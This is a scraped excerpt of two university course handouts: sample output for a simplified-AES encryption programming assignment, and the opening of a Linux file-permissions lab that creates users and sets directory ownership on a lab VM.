d4 d8 d1 ca e5 47 6d e0
48 d8 48 55 78 65 d0 45
59 c9 c3 d7 4c 73 4e e3
59 4d 47 48 c8 db f7 70
d2 4b d1 d4 51 f2 7f c5
50 d7 48 d1 e2 6e ed df
47 4b 59 56 e7 dd e2 71
cc 50 59 53 78 60 fe 48
d7 47 cf 50 53 52 53 71
d4 cf c9 4e 7f c3 55 6f
4d c6 cf 50 d6 ef 68 4b
cf 41 41 41 46 41 41 41
41 41 41 41 cf 41 41 41
41 41 41 41 cf 41 41 41
41 41 41 41 c8 41 41 41
CSCE 3550 Foundations of Cybersecurity Spring 2022
6
4. References
Although this encryption is a modified, simplified version of AES, you may refer to the Lecture 
Notes posted on Canvas or the following for background information on AES:
http://en.wikipedia.org/wiki/Advanced_Encryption_Standard
5. Testing
Test your program to verify that it operates as desired with a variety of input files. Compare the 
answers your code gives with the ones you get from hand-calculations.
Sample input and output appears below (with input shown in bold green):
SAMPLE OUTPUT #1
$ more input1.txt
ENCRYPT THIS MESSAGE USING THE ALGORITHM DESCRIBED BELOW.
$ more key1.txt
SIMPLEEXAMPLEKEY
$ ./a.out
Enter the name of the input plaintext file: input1.txt
Enter the name of the input key file: key1.txt
Enter the name of the output ciphertext file: output1.txt
Preprocessing:
ENCRYPTTHISMESSAGEUSINGTHEALGORITHMDESCRIBEDBELOW
Substitution:
WVOGJTXQHUHXICWYYMGHTRKQHQPWKYVGLPYSPWGOINTOFOPMO
Padding:
WVOG
JTXQ
HUHX
ICWY
YMGH
TRKQ
HQPW
KYVG
LPYS
PWGO
INTO
FOPM
OAAA
AAAA
AAAA
AAAA
ShiftRows:
WVOG
TXQJ
HXHU
YICW
CSCE 3550 Foundations of Cybersecurity Spring 2022
7
YMGH
RKQT
PWHQ
GKYV
LPYS
WGOP
TOIN
MFOP
OAAA
AAAA
AAAA
AAAA
Parity Bit:
d7 56 cf 47 
d4 d8 d1 ca 
48 d8 48 55 
59 c9 c3 d7 
59 4d 47 48 
d2 4b d1 d4 
50 d7 48 d1 
47 4b 59 56 
cc 50 59 53 
d7 47 cf 50 
d4 cf c9 4e 
4d c6 cf 50 
cf 41 41 41 
41 41 41 41 
41 41 41 41 
41 41 41 41 
MixColumns:
c3 ce 66 49 
e5 47 6d e0 
78 65 d0 45 
4c 73 4e e3 
c8 db f7 70 
51 f2 7f c5 
e2 6e ed df 
e7 dd e2 71 
78 60 fe 48 
53 52 53 71 
7f c3 55 6f 
d6 ef 68 4b 
46 41 41 41 
cf 41 41 41 
cf 41 41 41 
c8 41 41 41
$ more output1.txt
Preprocessing:
ENCRYPTTHISMESSAGEUSINGTHEALGORITHMDESCRIBEDBELOW
Substitution:
WVOGJTXQHUHXICWYYMGHTRKQHQPWKYVGLPYSPWGOINTOFOPMO
CSCE 3550 Foundations of Cybersecurity Spring 2022
8
Padding:
WVOG
JTXQ
HUHX
ICWY
YMGH
TRKQ
HQPW
KYVG
LPYS
PWGO
INTO
FOPM
OAAA
AAAA
AAAA
AAAA
ShiftRows:
WVOG
TXQJ
HXHU
YICW
YMGH
RKQT
PWHQ
GKYV
LPYS
WGOP
TOIN
MFOP
OAAA
AAAA
AAAA
AAAA
Parity Bit:
d7 56 cf 47 
d4 d8 d1 ca 
48 d8 48 55 
59 c9 c3 d7 
59 4d 47 48 
d2 4b d1 d4 
50 d7 48 d1 
47 4b 59 56 
cc 50 59 53 
d7 47 cf 50 
d4 cf c9 4e 
4d c6 cf 50 
cf 41 41 41 
CSCE 3550 Foundations of Cybersecurity Spring 2022
9
41 41 41 41 
41 41 41 41 
41 41 41 41 
MixColumns:
c3 ce 66 49 
e5 47 6d e0 
78 65 d0 45 
4c 73 4e e3 
c8 db f7 70 
51 f2 7f c5 
e2 6e ed df 
e7 dd e2 71 
78 60 fe 48 
53 52 53 71 
7f c3 55 6f 
d6 ef 68 4b 
46 41 41 41 
cf 41 41 41 
cf 41 41 41 
c8 41 41 41
SAMPLE OUTPUT #2
$ more input2.txt
MRS. DALLOWAY SAID SHE WOULD BUY THE FLOWERS HERSELF.
FOR LUCY HAD HER WORK CUT OUT FOR HER. THE DOORS WOULD BE TAKEN OFF THEIR 
HINGES; RUMPELMAYER'S MEN WERE COMING. AND THEN, THOUGHT CLARISSA DALLOWAY,
WHAT A MORNING - FRESH AS IF ISSUED TO CHILDREN ON A BEACH.
WHAT A LARK! WHAT A PLUNGE! FOR SO IT HAD ALWAYS SEEMED TO HER, WHEN, WITH A
LITTLE SQUEAK OF THE HINGES, WHICH SHE COULD HEAR NOW, SHE HAD BURST OPEN THE
FRENCH WINDOWS AND PLUNGED AT BOURTON INTO THE OPEN AIR. HOW FRESH, HOW CALM,
STILLER THAN THIS OF COURSE, THE AIR WAS IN THE EARLY MORNING; LIKE THE FLAP
OF A WAVE; THE KISS OF A WAVE; CHILL AND SHARP AND YET (FOR A GIRL OF EIGHTEEN
AS SHE THEN WAS) SOLEMN, FEELING AS SHE DID, STANDING THERE AT THE OPEN WINDOW,
THAT SOMETHING AWFUL WAS ABOUT TO HAPPEN; LOOKING AT THE FLOWERS, AT THE TREES
WITH THE SMOKE WINDING OFF THEM AND THE ROOKS RISING, FALLING; STANDING AND
LOOKING UNTIL PETER WALSH SAID, ""MUSING AMONG THE VEGETABLES?""-
WAS THAT IT?-""I PREFER MEN TO CAULIFLOWERS""- WAS THAT IT?
$ more key2.txt
VIRGINIAWOOLFMRS
$ ./a.out
Enter the name of the input plaintext file: input2.txt
Enter the name of the input key file: key2.txt
Enter the name of the output ciphertext file: output2.txt
Preprocessing:
MRSDALLOWAYSAIDSHEWOULDBUYTHEFLOWERSHERSELFFORLUCYHADHERWORKCUTOUTFORHERTHEDOOR
SWOULDBETAKENOFFTHEIRHINGESRUMPELMAYERSMENWERECOMINGANDTHENTHOUGHTCLARISSADALLO
WAYWHATAMORNINGFRESHASIFISSUEDTOCHILDRENONABEACHWHATALARKWHATAPLUNGEFORSOITHADA
LWAYSSEEMEDTOHERWHENWITHALITTLESQUEAKOFTHEHINGESWHICHSHECOULDHEARNOWSHEHADBURST
OPENTHEFRENCHWINDOWSANDPLUNGEDATBOURTONINTOTHEOPENAIRHOWFRESHHOWCALMSTILLERTHAN
THISOFCOURSETHEAIRWASINTHEEARLYMORNINGLIKETHEFLAPOFAWAVETHEKISSOFAWAVECHILLANDS
HARPANDYETFORAGIRLOFEIGHTEENASSHETHENWASSOLEMNFEELINGASSHEDIDSTANDINGTHEREATTHE
OPENWINDOWTHATSOMETHINGAWFULWASABOUTTOHAPPENLOOKINGATTHEFLOWERSATTHETREESWITHTH
ESMOKEWINDINGOFFTHEMANDTHEROOKSRISINGFALLINGSTANDINGANDLOOKINGUNTILPETERWALSHSA
IDMUSINGAMONGTHEVEGETABLESWASTHATITIPREFERMENTOCAULIFLOWERSWASTHATIT
Substitution:
CSCE 3550 Foundations of Cybersecurity Spring 2022
10
HZJJIYTOSOMDFUUKCMNUCYLBQMHSJRCGRMIYPRZSAZTQTDCMXGYGLUMRSCFVHGKGPBWUZUMRPVSOTAI
KRWLRLOMTWYSYTRWLCMZXPVVGAGFFRBVDHIPKZFUEJKSCJOFEDVXGVQBHABHSTGXZOKCGZVASWROWQA
NSTEYGBNUONBWYLRIWNPRYQSQSOISOYATZDTUXMAWNWPSLHTNZVBRRIESWDOHLUXLFBMWUZFWIPVOOF
XNSTAJKMZMDPCVPWIYWIEZZPNTIPHZPXCLWVSFLBUMHEBUPXIYAXPJNMPWUHRVPFDEGRAYKPNLBQFGE
TBVFOPVLZRVCDKWYIANKVVUVTHVGAROEGALJOWEOVGWTDSCAJZRAMPFCNEMSDVCHHMCENBZRTRZTDOB
EMUJGAKFAZFMTDSOTWIRKDVKNMRIRHMAZWZZFBTZQMGPEBZOATRROVDVZPRSIOGCQFIRNZKYOTYINZG
VLWBRFYGVZNBZACWFWTRVABPKKMAISOVSEMQEOVAJUTRUNBSSWNZXSNAYKLVLSPOBONZXLCMIKIGBHA
CDPSIZFYWNZPNBSKASEMUEYVEWATJISWPCFYFFZVXGKVYWOGWBRFFKZZNCUERZSWHHSJFIWZANOBUBH
AGAZPQNAILZTOBNFPVSXFZULCMIUWXAREGWYLRRDGQEMAGINZWBRFZUDJWBOVTCNPWZAJFVJRICYPFI
IZAIDNZXSHWEMBUMVAUSEFNCWNERYBUITEHWAWQWWMUVTBBKAQZWQQANWMANGAGPAPWH
Padding:
HZJJ
IYTO
SOMD
FUUK
CMNU
CYLB
QMHS
JRCG
RMIY
PRZS
AZTQ
TDCM
XGYG
LUMR
SCFV
HGKG
PBWU
ZUMR
PVSO
TAIK
RWLR
LOMT
WYSY
TRWL
CMZX
PVVG
AGFF
RBVD
HIPK
ZFUE
JKSC
JOFE
DVXG
VQBH
ABHS
TGXZ
OKCG
ZVAS
WROW
QANS
TEYG
CSCE 3550 Foundations of Cybersecurity Spring 2022
11
BNUO
NBWY
LRIW
NPRY
QSQS
OISO
YATZ
DTUX
MAWN
WPSL
HTNZ
VBRR
IESW
DOHL
UXLF
BMWU
ZFWI
PVOO
FXNS
TAJK
MZMD
PCVP
WIYW
IEZZ
PNTI
PHZP
XCLW
VSFL
BUMH
EBUP
XIYA
XPJN
MPWU
HRVP
FDEG
RAYK
PNLB
QFGE
TBVF
OPVL
ZRVC
DKWY
IANK
VVUV
THVG
AROE
GALJ
OWEO
VGWT
DSCA
JZRA
CSCE 3550 Foundations of Cybersecurity Spring 2022
12
MPFC
NEMS
DVCH
HMCE
NBZR
TRZT
DOBE
MUJG
AKFA
ZFMT
DSOT
WIRK
DVKN
MRIR
HMAZ
WZZF
BTZQ
MGPE
BZOA
TRRO
VDVZ
PRSI
OGCQ
FIRN
ZKYO
TYIN
ZGVL
WBRF
YGVZ
NBZA
CWFW
TRVA
BPKK
MAIS
OVSE
MQEO
VAJU
TRUN
BSSW
NZXS
NAYK
LVLS
POBO
NZXL
CMIK
IGBH
ACDP
SIZF
YWNZ
PNBS
CSCE 3550 Foundations of Cybersecurity Spring 2022
13
KASE
MUEY
VEWA
TJIS
WPCF
YFFZ
VXGK
VYWO
GWBR
FFKZ
ZNCU
ERZS
WHHS
JFIW
ZANO
BUBH
AGAZ
PQNA
ILZT
OBNF
PVSX
FZUL
CMIU
WXAR
EGWY
LRRD
GQEM
AGIN
ZWBR
FZUD
JWBO
VTCN
PWZA
JFVJ
RICY
PFII
ZAID
NZXS
HWEM
BUMV
AUSE
FNCW
NERY
BUIT
EHWA
WQWW
MUVT
BBKA
QZWQ
QANW
CSCE 3550 Foundations of Cybersecurity Spring 2022
14
MANG
AGPA
PWHA
AAAA
ShiftRows:
HZJJ
YTOI
MDSO
KFUU
CMNU
YLBC
HSQM
GJRC
RMIY
RZSP
TQAZ
MTDC
XGYG
UMRL
FVSC
GHGK
PBWU
UMRZ
SOPV
KTAI
RWLR
OMTL
SYWY
LTRW
CMZX
VVGP
FFAG
DRBV
HIPK
FUEZ
SCJK
EJOF
DVXG
QBHV
HSAB
ZTGX
OKCG
VASZ
OWWR
SQAN
TEYG
NUOB
WYNB
WLRI
NPRY
SQSQ
CSCE 3550 Foundations of Cybersecurity Spring 2022
15
SOOI
ZYAT
DTUX
AWNM
SLWP
ZHTN
VBRR
ESWI
HLDO
FUXL
BMWU
FWIZ
OOPV
SFXN
TAJK
ZMDM
VPPC
WWIY
IEZZ
NTIP
ZPPH
WXCL
VSFL
UMHB
UPEB
AXIY
XPJN
PWUM
VPHR
GFDE
RAYK
NLBP
GEQF
FTBV
OPVL
RVCZ
WYDK
KIAN
VVUV
HVGT
OEAR
JGAL
OWEO
GWTV
CADS
AJZR
MPFC
EMSN
CHDV
EHMC
CSCE 3550 Foundations of Cybersecurity Spring 2022
16
NBZR
RZTT
BEDO
GMUJ
AKFA
FMTZ
OTDS
KWIR
DVKN
RIRM
AZHM
FWZZ
BTZQ
GPEM
OABZ
OTRR
VDVZ
RSIP
CQOG
NFIR
ZKYO
YINT
VLZG
FWBR
YGVZ
BZAN
FWCW
ATRV
BPKK
AISM
SEOV
OMQE
VAJU
RUNT
SWBS
SNZX
NAYK
VLSL
BOPO
LNZX
CMIK
GBHI
DPAC
FSIZ
YWNZ
NBSP
SEKA
YMUE
VEWA
JIST
CFWP
CSCE 3550 Foundations of Cybersecurity Spring 2022
17
ZYFF
VXGK
YWOV
BRGW
ZFFK
ZNCU
RZSE
HSWH
WJFI
ZANO
UBHB
AZAG
APQN
ILZT
BNFO
SXPV
LFZU
CMIU
XARW
WYEG
DLRR
GQEM
GINA
BRZW
DFZU
JWBO
TCNV
ZAPW
JJFV
RICY
FIIP
IDZA
SNZX
HWEM
UMVB
SEAU
WFNC
NERY
UITB
WAEH
WWQW
MUVT
BKAB
WQQZ
WQAN
MANG
GPAA
HAPW
AAAA
Parity Bit:
CSCE 3550 Foundations of Cybersecurity Spring 2022
18
48 5a ca ca 
59 d4 cf c9 
4d 44 53 cf 
4b c6 55 55 
c3 4d 4e 55 
59 cc 42 c3 
48 53 d1 4d 
47 ca d2 c3 
d2 4d c9 59 
d2 5a 53 50 
d4 d1 41 5a 
4d d4 44 c3 
d8 47 59 47 
55 4d d2 cc 
c6 56 53 c3 
47 48 47 4b 
50 42 d7 55 
55 4d d2 5a 
53 cf 50 56 
4b d4 41 c9 
d2 d7 cc d2 
cf 4d d4 cc 
53 59 d7 59 
cc d4 d2 d7 
c3 4d 5a d8 
56 56 47 50 
c6 c6 41 47 
44 d2 42 56 
48 c9 50 4b 
c6 55 c5 5a 
53 c3 ca 4b 
c5 ca cf c6 
44 56 d8 47 
d1 42 48 56 
48 53 41 42 
5a d4 47 d8 
cf 4b c3 47 
56 41 53 5a 
cf d7 d7 d2 
53 d1 41 4e 
d4 c5 59 47 
4e 55 cf 42 
d7 59 4e 42 
d7 cc d2 c9 
4e 50 d2 59 
53 d1 53 d1 
53 cf cf c9 
5a 59 41 d4 
44 d4 55 d8 
41 d7 4e 4d 
53 cc d7 50 
5a 48 d4 4e 
56 42 d2 d2 
c5 53 d7 c9 
48 cc 44 cf 
c6 55 d8 cc 
42 4d d7 55 
c6 d7 c9 5a 
cf cf 50 56 
53 c6 d8 4e 
d4 41 ca 4b 
5a 4d 44 4d 
56 50 50 c3 
CSCE 3550 Foundations of Cybersecurity Spring 2022
19
d7 d7 c9 59 
c9 c5 5a 5a 
4e d4 c9 50 
5a 50 50 48 
d7 d8 c3 cc 
56 53 c6 cc 
55 4d 48 42 
55 50 c5 42 
41 d8 c9 59 
d8 50 ca 4e 
50 d7 55 4d 
56 50 48 d2 
47 c6 44 c5 
d2 41 59 4b 
4e cc 42 50 
47 c5 d1 c6 
c6 d4 42 56 
cf 50 56 cc 
d2 56 c3 5a 
d7 59 44 4b 
4b c9 41 4e 
56 56 55 56 
48 56 47 d4 
cf c5 41 d2 
ca 47 41 cc 
cf d7 c5 cf 
47 d7 d4 56 
c3 41 44 53 
41 ca 5a d2 
4d 50 c6 c3 
c5 4d 53 4e 
c3 48 44 56 
c5 48 4d c3 
4e 42 5a d2 
d2 5a d4 d4 
42 c5 44 cf 
47 4d 55 ca 
41 4b c6 41 
c6 4d d4 5a 
cf d4 44 53 
4b d7 c9 d2 
44 56 4b 4e 
d2 c9 d2 4d 
41 5a 48 4d 
c6 d7 5a 5a 
42 d4 5a d1 
47 50 c5 4d 
cf 41 42 5a 
cf d4 d2 d2 
56 44 56 5a 
d2 53 c9 50 
c3 d1 cf 47 
4e c6 c9 d2 
5a 4b 59 cf 
59 c9 4e d4 
56 cc 5a 47 
c6 d7 42 d2 
59 47 56 5a 
42 5a 41 4e 
c6 d7 c3 d7 
41 d4 d2 56 
42 50 4b 4b 
41 c9 53 4d 
CSCE 3550 Foundations of Cybersecurity Spring 2022
20
53 c5 cf 56 
cf 4d d1 c5 
56 41 ca 55 
d2 55 4e d4 
53 d7 42 53 
53 4e 5a d8 
4e 41 59 4b 
56 cc 53 cc 
42 cf 50 cf 
cc 4e 5a d8 
c3 4d c9 4b 
47 42 48 c9 
44 50 41 c3 
c6 53 c9 5a 
59 d7 4e 5a 
4e 42 53 50 
53 c5 4b 41 
59 4d 55 c5 
56 c5 d7 41 
ca c9 53 d4 
c3 c6 d7 50 
5a 59 c6 c6 
56 d8 47 4b 
59 d7 cf 56 
42 d2 47 d7 
5a c6 c6 4b 
5a 4e c3 55 
d2 5a 53 c5 
48 53 d7 48 
d7 ca c6 c9 
5a 41 4e cf 
55 42 48 42 
41 5a 41 47 
41 50 d1 4e 
c9 cc 5a d4 
42 4e c6 cf 
53 d8 50 56 
cc c6 5a 55 
c3 4d c9 55 
d8 41 d2 d7 
d7 59 c5 47 
44 cc d2 d2 
47 d1 c5 4d 
47 c9 4e 41 
42 d2 5a d7 
44 c6 5a 55 
ca d7 42 cf 
d4 c3 4e 56 
5a 41 50 d7 
ca ca c6 56 
d2 c9 c3 59 
c6 c9 c9 50 
c9 44 5a 41 
53 4e 5a d8 
48 d7 c5 4d 
55 4d 56 42 
53 c5 41 55 
d7 c6 4e c3 
4e c5 d2 59 
55 c9 d4 42 
d7 41 c5 48 
d7 d7 d1 d7 
4d 55 56 d4 
CSCE 3550 Foundations of Cybersecurity Spring 2022
21
42 4b 41 42 
d7 d1 d1 5a 
d7 d1 41 4e 
4d 41 4e 47 
47 50 41 41 
48 41 50 d7 
41 41 41 41 
MixColumns:
7d 51 c3 55 
66 e3 ef 5c 
56 57 5c 79 
5a e9 73 e9 
79 4c 59 7a 
ee f1 70 dc 
c3 62 d8 52 
c1 c7 fe ec 
4b 71 79 db 
47 45 e8 d4 
64 c9 d4 e3 
f1 ef da 7c 
d5 47 cb 49 
64 6f 54 d1 
d3 7e e4 cb 
6e 42 e4 50 
47 48 c9 db 
44 46 d9 d2 
7e ed 66 e3 
60 f7 62 7a 
6a ef e1 7e 
6e 72 cf 6d 
f4 4f c0 ce 
72 c5 f3 4d 
e5 74 7e 4a 
7a 62 55 e7 
ce e1 59 fc 
46 f8 6c c8 
57 7f f1 f5 
ef f7 4b e4 
7c 44 50 d6 
dc 59 7a 5b 
f2 ed 75 ee 
7f f3 cc f5 
eb d5 db e6 
e1 58 f4 76 
e3 53 fe fc 
7a 7a 46 d0 
e9 d7 e6 70 
75 f2 58 dd 
61 fb 64 c3 
fd 48 dc cc 
4d 6d 67 c1 
4b db d5 40 
60 5e c4 c7 
47 fa 7f 74 
55 ef c7 66 
66 5c 73 40 
42 55 7b 62 
69 66 7f fc 
4d 58 c9 e7 
6a ec d5 f2 
76 e8 41 fc 
d9 fe 73 dd 
CSCE 3550 Foundations of Cybersecurity Spring 2022
22
52 6d fe d1 
e0 f3 55 e8 
49 f1 7d 5c 
cc 74 76 55 
f4 4e cd 71 
69 58 50 6f 
dc d2 da db 
4d fc 7b d6 
40 ce 6e 70 
de 6b d8 e1 
d6 7e 67 c0 
6c 5e e0 ee 
51 c2 6d d5 
e1 7b ea 75 
47 f9 43 5e 
42 e1 cb d7 
6a cd 5f e1 
78 43 55 fd 
4a 54 7c 5c 
c5 d3 fc 7c 
ed 76 c3 e8 
fb e0 d0 dc 
ec dc e7 f6 
41 42 f7 ec 
43 7b 64 76 
f3 79 fc e7 
74 ca f7 68 
59 de 46 eb 
75 f4 de d2 
d9 76 ff c2 
71 d4 63 d5 
46 e9 59 44 
de 58 53 72 
f2 e7 7b 7f 
ce 5c e8 fe 
5e 6b e0 44 
d6 c7 77 52 
4c 7b 70 f0 
c8 77 6b da 
47 5a e1 66 
41 55 ca 7f 
40 65 dc db 
f4 e2 c2 dd 
70 ef 70 e1 
d1 5e f9 c6 
cc c3 d4 f9 
57 42 7d ed 
d7 61 70 d2 
df d7 da d0 
5c f1 48 75 
62 61 e9 5c 
fe e6 76 59 
45 49 e7 77 
c8 dc f3 66 
4d d6 70 e6 
49 63 df 77 
ca 61 76 45 
cb c5 d6 c0 
4c 6a ea d1 
f9 4c 5c e1 
cb ff 5a e9 
77 d9 75 46 
cf cd 78 77 
CSCE 3550 Foundations of Cybersecurity Spring 2022
23
d4 5a 69 67 
fe 63 65 f8 
76 6d 7b 66 
f3 63 7e e7 
cd 45 58 f2 
4f cf e7 5b 
ed f7 c7 db 
db 68 7d d2 
fa c0 76 ee 
ef df f5 fe 
51 66 f8 57 
c1 e4 45 46 
4f c7 ca cb 
d7 73 ee 54 
dd dd fd d3 
e8 4c 4d ce 
e8 c6 55 5a 
d3 da 44 71 
45 5c 5c 75 
d6 5f d9 4f 
47 6a 53 c6 
5d 5a 43 f1 
ca 63 c0 63 
6a fb 77 c0 
69 4a 60 fc 
5a d3 74 dc 
44 7f 60 6e 
70 4e 51 73 
dd 44 d5 c4 
ef 70 60 64 
47 e9 71 d0 
5f dd 45 f0 
78 c6 cd ce 
65 e1 57 75 
55 e1 d6 ca 
46 eb 79 7f 
ea c5 c1 d5 
7a f7 74 40 
c1 54 4d fb 
4b 4e d4 4a 
72 7b cc cc 
4e 47 ec d1 
78 7b 62 d3 
d0 4f ef fa 
74 e5 67 fe 
62 78 d2 48 
d2 4e cc 54 
7d cc f3 5d 
4e e8 f0 fb 
62 f1 e7 61 
d9 4c e8 d0 
41 ed 43 db 
4b f3 ed f8 
48 f6 d1 46 
44 e4 f4 eb 
78 60 c0 fe 
5d 43 e8 57 
ef d3 fd d6 
44 6f 4f 67 
74 c3 dd db 
56 c2 fe e2 
68 5a 50 f8 
c4 51 79 51 
CSCE 3550 Foundations of Cybersecurity Spring 2022
24
eb 61 64 ca 
c0 df e4 f5 
d9 5a c3 fb 
6b 7d df 5d 
63 47 cc eb 
51 58 e4 d2 
cc ec ff e9 
e5 69 c5 54 
5c 77 ff 61 
7c 7a fd f0 
d8 cf 6d f0 
f7 dc e8 e3 
5a 72 4e db 
5a 63 7d e6 
59 50 6c 70 
5a 50 41 dd 
$ more output2.txt
Preprocessing:
MRSDALLOWAYSAIDSHEWOULDBUYTHEFLOWERSHERSELFFORLUCYHADHERWORKCUTOUTFORHERTHEDOOR
SWOULDBETAKENOFFTHE
IRHINGESRUMPELMAYERSMENWERECOMINGANDTHENTHOUGHTCLARISSADALLOWAYWHATAMORNINGFRES
HASIFISSUEDTOCHILDR
ENONABEACHWHATALARKWHATAPLUNGEFORSOITHADALWAYSSEEMEDTOHERWHENWITHALITTLESQUEAKO
FTHEHINGESWHICHSHEC
OULDHEARNOWSHEHADBURSTOPENTHEFRENCHWINDOWSANDPLUNGEDATBOURTONINTOTHEOPENAIRHOWF
RESHHOWCALMSTILLERT
HANTHISOFCOURSETHEAIRWASINTHEEARLYMORNINGLIKETHEFLAPOFAWAVETHEKISSOFAWAVECHILLA
NDSHARPANDYETFORAGI
RLOFEIGHTEENASSHETHENWASSOLEMNFEELINGASSHEDIDSTANDINGTHEREATTHEOPENWINDOWTHATSO
METHINGAWFULWASABOU
TTOHAPPENLOOKINGATTHEFLOWERSATTHETREESWITHTHESMOKEWINDINGOFFTHEMANDTHEROOKSRISI
NGFALLINGSTANDINGAN
DLOOKINGUNTILPETERWALSHSAIDMUSINGAMONGTHEVEGETABLESWASTHATITIPREFERMENTOCAULIFL
OWERSWASTHATIT
Substitution:
HZJJIYTOSOMDFUUKCMNUCYLBQMHSJRCGRMIYPRZSAZTQTDCMXGYGLUMRSCFVHGKGPBWUZUMRPVSOTAI
KRWLRLOMTWYSYTRWLCM
ZXPVVGAGFFRBVDHIPKZFUEJKSCJOFEDVXGVQBHABHSTGXZOKCGZVASWROWQANSTEYGBNUONBWYLRIWN
PRYQSQSOISOYATZDTUX
MAWNWPSLHTNZVBRRIESWDOHLUXLFBMWUZFWIPVOOFXNSTAJKMZMDPCVPWIYWIEZZPNTIPHZPXCLWVSF
LBUMHEBUPXIYAXPJNMP
WUHRVPFDEGRAYKPNLBQFGETBVFOPVLZRVCDKWYIANKVVUVTHVGAROEGALJOWEOVGWTDSCAJZRAMPFCN
EMSDVCHHMCENBZRTRZT
DOBEMUJGAKFAZFMTDSOTWIRKDVKNMRIRHMAZWZZFBTZQMGPEBZOATRROVDVZPRSIOGCQFIRNZKYOTYI
NZGVLWBRFYGVZNBZACW
FWTRVABPKKMAISOVSEMQEOVAJUTRUNBSSWNZXSNAYKLVLSPOBONZXLCMIKIGBHACDPSIZFYWNZPNBSK
ASEMUEYVEWATJISWPCF
YFFZVXGKVYWOGWBRFFKZZNCUERZSWHHSJFIWZANOBUBHAGAZPQNAILZTOBNFPVSXFZULCMIUWXAREGW
YLRRDGQEMAGINZWBRFZ
UDJWBOVTCNPWZAJFVJRICYPFIIZAIDNZXSHWEMBUMVAUSEFNCWNERYBUITEHWAWQWWMUVTBBKAQZWQQ
ANWMANGAGPAPWH
Padding:
HZJJ
IYTO
SOMD
FUUK
CMNU
CYLB
QMHS
JRCG
CSCE 3550 Foundations of Cybersecurity Spring 2022
25
… (continued output not shown due to length)
6. Requirements
• Your code should be well documented in terms of comments. For example, good comments
in general consist of a header (with your name, course section, date, and a brief description),
comments for each variable, and commented “blocks” of code.
• Your program will be graded largely on whether it works correctly on the CSE machines
(e.g., cse01, cse02, …, cse06), so you should make sure that your program compiles and
runs on a CSE machine.
• Please pay attention to the SAMPLE OUTPUT for how this program is expected to work. If
you have any questions about this, please contact your instructor or TA assigned to this
course to ensure you understand these directions.
• This is an individual programming assignment that must be the sole work of the individual 
student. Any instance of academic dishonesty will result in a grade of “F” for the course, 
along with a report filed into the Academic Integrity Database.
7. Submission
• You will electronically submit all of your source code files, makefile, if applicable, plus a 
README file with any important compiling/running instructions for the TA to the 
Project 3 dropbox in Canvas by the due date.
• Note that the dates on your electronic submission will be used to verify that you met the due 
date above. Projects submitted late up to 1 day (i.e., 24 hours) will receive a 30% grade 
penalty. Later submissions will receive zero credit, so hand in your best effort on the due 
date.
• The work submitted for this project must be your own work and done individually. Evidence 
to the contrary will receive a “0” for this project and may result in further disciplinary action.
If you have any questions or concerns about what is expected in this project, please contact your 
instructor."
"['file', 'file permissions', 'permissions', 'home', 'user', 'linux', 'set', 'root', 'permissions in linux', 'directory', 'test', 'users', 'bit', 'command', 'csce', 'fall', 'permission', 'sudo', 'linux file system', 'lab', 'files', 'link', 'root user', 'touch', 'group']",The University of North Texas,INTRO TO COMPUTER SECURITY,5550,File Permissions Linux 1,Lab,"Student Name:
Course: CSCE 5550
Semester: Fall 2022
Lab: File Permissions in Linux
Lab 3a: File Permissions in Linux
In this lab, you will be using the Ubuntu 20 VM. The credentials are: 
Username: sec-lab
Password: untccdc
NOTE: Address all the questions (Q1, Q2, etc.) marked in bold.
When a screenshot is requested, try to fit all the results in one image. 
If this is not possible, then attach multiple screenshots.
When a question is asked, e.g. “Who is the owner of the file?”, type your answer, 
do not simply provide a screenshot.
IMPORTANT NOTE: Before starting the lab, you must customize your command prompt as described 
in the Command Prompt Customization Manual. This customization manual directs you to place your 
EUID (Enterprise User ID) into the command prompt. Submissions which do not comply with this 
requirement will receive no credit.
Introduction
Unix File Hierarchy
The Unix/Linux file system is organized as a hierarchy with the root (/) directory at the highest level. 
(In this lab, we will use the terms “Unix” and “Linux” interchangeably.) Some typical Unix system 
directories are /usr, /bin, /sbin, /home, /var, /boot, /dev, /etc, and others. In the figure shown below, 
“user1” and “user2” are the subdirectories of the directory “home”, “hello.txt” is a plain text file and 
“link_hello” is a link file that points to “hello.txt”.
In order to access the file “/test/temp/hello.txt”, the system begins its search from the root (/) directory,
then “test” and “temp” directories consecutively, and then finally it finds the file “hello.txt”.
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Lab: File Permissions in Linux
Ownership and Permissions
Ownership of files in UNIX can be viewed in one of three ways: “owner” (creator), “group” or “others”
(i.e., all the other users, apart from the owner and the group members). Using this simple notion of 
ownership, access to files can be controlled by associating a unique user ID (UID) and a group ID 
(GID) with twelve permission bits for each file. Typically, these bits are divided into three sets of three 
bits each, as well as three extra bits as shown in the table below.
The values “r”, “w” and “x” stand for read, write and execute bits for each of the owner, group and 
others permissions. The values “su”, “sg” and “t” stand for set_user_id (setuid), set_group_id (setgid) 
and the sticky bit, respectively. These 4 sets of bits are often represented in their octal digits. 
For example, “100 111 101 101” is represented as “4755”. When the “su” bit is set, the UID of 
the process will be that of the owner of the file, no matter who executes the file. Similarly, if the “sg” 
bit is set, the GID of the process will be that of the group.
Section 1: Setting up the file structure and the user space
The objective of this section is to setup the file hierarchy structure and the user accounts that are 
required for the following sections. The “su” command is used to switch users.
1. Login as root
a. sudo su
b. enter password when prompted.
c. Now you are root, and the ‘#’ prompt represents the root mode 
(while the prompt ‘$’ represents the ordinary user mode).
2. Use useradd command to create two new users user1 and user2 as follows:
a. useradd user1 -g users 
b. mkdir /home/user1
c. chown user1:users /home/user1
d. useradd user2 -g users 
e. mkdir /home/user2
f. chown user2:users /home/user2
3. Use passwd command to set the password for the users you created (required in the case you 
want to log in). For convenience, set the passwords to be the same as the usernames. You need 
to retype the passwords and ignore password warnings:
a. passwd user1 
 New password: user1
 Retype new password: user1
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Lab: File Permissions in Linux
b. passwd user2
 New password: user2
 Retype new password: user2
4. Check user information with the id command. Note the uid, gid for each output.
a. id user1
b. id user2
Q1: Attach a screenshot of the result.
5. Create a directory structure:
a. mkdir /test
b. mkdir /test/temp 
6. Switch user roles as user1 and then back to root using the su command
a. whoami
b. sudo su user1 (check ‘$’ indicate user mode)
c. sudo su OR sudo su root
(Unable to switch to root? You might want to add user1 to the sudoers file.)
Note: Adding a user in the sudoers file:
1. Edit “/etc/sudoers” file and add the line described below.
2. Add this line for the users “<username> ALL=(ALL:ALL) ALL”
7. Create a new file as root user
a. touch /home/user2/HelloWorld
b. ls -l /home/user2/HelloWorld
Q2: Who is its owner and what is its group?
8. Change the group ownership as well as the user ownership of the file:
a. chgrp users /home/user2/HelloWorld
